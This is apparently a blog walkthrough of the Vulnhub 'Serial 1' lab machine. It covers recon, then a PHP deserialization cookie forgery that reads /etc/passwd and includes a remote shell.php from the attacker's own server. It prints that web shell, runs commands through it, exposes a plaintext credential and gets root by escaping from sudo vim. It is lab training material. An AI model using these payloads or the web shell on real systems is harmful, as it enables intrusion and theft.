---
author:
  name: "hexterisk"
date: 2020-05-08
linktitle: Serial 1
type:
- post
- posts
title: Serial 1
tags: ["Serial1", "Vulnhub", "pentesting", "penetration", "testing", "vim"]
weight: 10
categories: ["Pentesting"]
---

*   **Name**: [serial: 1](https://www.vulnhub.com/entry/serial-1,349/)
*   **Date release**: 20 Aug 2019
*   **Author**: [sk4](https://www.vulnhub.com/author/sk4,633/)
*   **Series**: [serial](https://www.vulnhub.com/series/serial,231/)

# Initial Discovery

`VMIP` is the VM’s IP Address

`LHIP` is the Local Host’s IP Address

Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.  
 

### IP Discovery

Run `sudo netdiscover`.

It detects online hosts by sending ARP requests.

!["netdiscover"](/Serial_1/1_image.png)
_Output of netdiscover._

192.168.1.8 happens to be the IP of the VM.

### Port Discovery

Next, we move on to port discovery to find out if there any exposed ports, and their corresponding services.

Run `nmap -sC -sV -p- -A 192.168.1.8`

Format: `nmap -sC -sV -p- -A VMIP`

!["nmap"](/Serial_1/2_image.png)
_Output of nmap._

Nothing of consequence, although we might attempt connecting to the ssh service if we somehow get hold of the credentials.

### Directory Discovery

Attempting to enumerate through all the endpoints.

Here, we are using [common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) wordlist.

!["gobuster"](/Serial_1/3_image.png)
_Output of gobuster._

`WORDLIST` is the dictionary containing a list of possible endpoints.

Run `gobuster dir -w common.txt -u 192.168.1.8`

Format: `gobuster dir -w WORDLIST -u VMIP`

`/backup` endpoint seems interesting.

### Manual Discovery

So we visit the homepage.

!["home"](/Serial_1/16_image.png)
_Homepage._

The word cookie seems to have some significance here. Let’s check out the cookies on the page.

!["cookie"](/Serial_1/17_image.png)
_user cookie._

A cookie does exists for the user.

Let's checkout the `/backup` endpoint.

!["/backup"](/Serial_1/31_image.png)
_/backup endpoint._

A **bak.zip** is present. Download it and uncompress it.

Run `unzip bak.zip`

!["bak"](/Serial_1/4_image.png)
_Files inside bak.zip_

Analysis of the files is given as follows:

##### index.php

!["index"](/Serial_1/6_image.png)
_index.php_

We can see that a cookie is formed here, serialized and base64 encoded, based on the username provided.

The default cookie is `Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0 =`.

Base64 decoding the cookie:

```python
import base64
print(base64.b64decode("Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0 ="))
```

`O: 4: ”User”: 2: {s: 10: ”Username”; s: 3: ”sk4"; s: 9: ”Userwel”; O: 7: ”Welcome”: 0: {}}`

##### user.class.php

!["user.class"](/Serial_1/7_image.png)
_user.class.php_

The log class file is imported. This could potentially contain a vulnerability for LFI/RFI.

##### log.class.php

!["log.class"](/Serial_1/8_image.png)
_log.class.php_

The stray **$type\_log** variable could be used to mention files. Other than that, Plain and simple file that executes an echo for the message provided to it.

# Hunting begins

We add the line `echo base64_encode(serialize(new User('admin')));` to obtain a cookie with user set as admin.

!["admin_cookie"](/Serial_1/12_image.png)
_Output a cookie with user set as admin._

We change the initialization class of the object **$this→wel**.

!["wel"](/Serial_1/10_image.png)
_Modified wel object._

We point the **$type\_log** to _**/etc/passwd**_.

!["type_log"](/Serial_1/11_image.png)
_Modified $type\_log variable._

We then execute the _**user.class.php**_ file to see if our changes yielded any results.

Run `php user.class.php`

!["user.class"](/Serial_1/13_image.png)
_Modified user.class.php output._

We got the output of _**/etc/passwd**_, as specified in the changes.

A new cookie is also obtained.

`Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6MTM6IgBMb2cAdHlwZV9sb2ciO3M6MTE6Ii9ldGMvcGFzc3dkIjt9fQ==`

Let's decode it and check it's contents.

`O:4:"User":2:{s:10:"Username";s:5:"admin";s:9:"Userwel";O:3:"Log":1:{s:13:"Logtype_log";s:11:"/etc/passwd";}}`

This proves that the instructions lie in the parameters provided inside the cookie.

We exploit the RFI vulnerability present here by spawning a local server and linking the **$type\_log** variable to this shell file.

!["python_server"](/Serial_1/14_image.png)
_Spawn a python3 Simple HTTP Server._

And modify the _**log.class.php**_ file to fetch the shell.php file.

Added `http://192.168.1.6:8000/shell.php`

Format: `http://LHIP:8000/shell.php`

!["type_log"](/Serial_1/15_image.png)
_Modified $type\_log variable._

Where, the _**shell.php**_ file is as follows:

```php
<?php
system($_GET["cmd"]);
?>
```

Obtain the new cookie, and replace it with the previous cookie.

Run `php user.class.php`

!["cookie_shell"](/Serial_1/19_image.png)
_Cookie with shell._

The new cookie `Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6MTM6IgBMb2cAdHlwZV9sb2ciO3M6MzM6Imh0dHA6Ly8xOTIuMTY4LjEuNjo4MDAwL3NoZWxsLnBocCI7fX0=`

Decodes to be 

`O:4:"User":2:{s:10:"Username";s:5:"admin";s:9:"Userwel";O:3:"Log":1:{s:13:"Logtype_log";s:33:"http://192.168.1.6:8000/shell.php";}}`

A `GET` request at `http://192.168.1.3/?cmd=whoami`

`Format: http://LHIP/?cmd=COMMAND`

!["request"](/Serial_1/21_image.png)
_Output of GET request._

It worked!

We know have a makeshift shell.

After exploring around, I found a file named _**credentials.txt.bak**_ in the root directory.

A `GET` request at `http://192.168.1.3/?cmd=ls /`

`Format: http://LHIP/?cmd=ls /`

!["request"](/Serial_1/22_image.png)
_Output of GET request._

A `GET` request at `http://192.168.1.3/?cmd=cat /credentials.txt.bak`

Format: `http://LHIP/?cmd=cat /credentials.txt.bak`

![](/Serial_1/23_image.png)

Output of GET request.

> sk4:KywZmnPWW6tTbW5w

They look like credentials of some sort.

I was able to successfully connect to the SSH service using these values as credentials. In the home directory itself is a file named _**flag.txt**_. It's the user flag.

!["user_flag"](/Serial_1/25_image.png)
_User flag._

Now, for privilege escalation, let's first find out all the binaries that can run with the superuser privilege.

Run `sudo -l`

!["sudo"](/Serial_1/28_image.png)
-Output of sudo -l._

Vim can be run as sudo.

Run `sudo /usr/bin/vim`

When you are in command mode(you're there already when vim opens), press `:` to enter commands.

Enter `!/bin/bash`

!["root_shell"](/Serial_1/29_image.png)
_Spawn a shell from inside vim._

This forcefully spawns a bash shell. Since it is spawned via the vim binary, it will have the same privileges as the vim binary. Thus we obtained a root shell.

Then just navigate to the root directory and read the flag file.

!["root_flag"](/Serial_1/30_image.png)
_Root flag._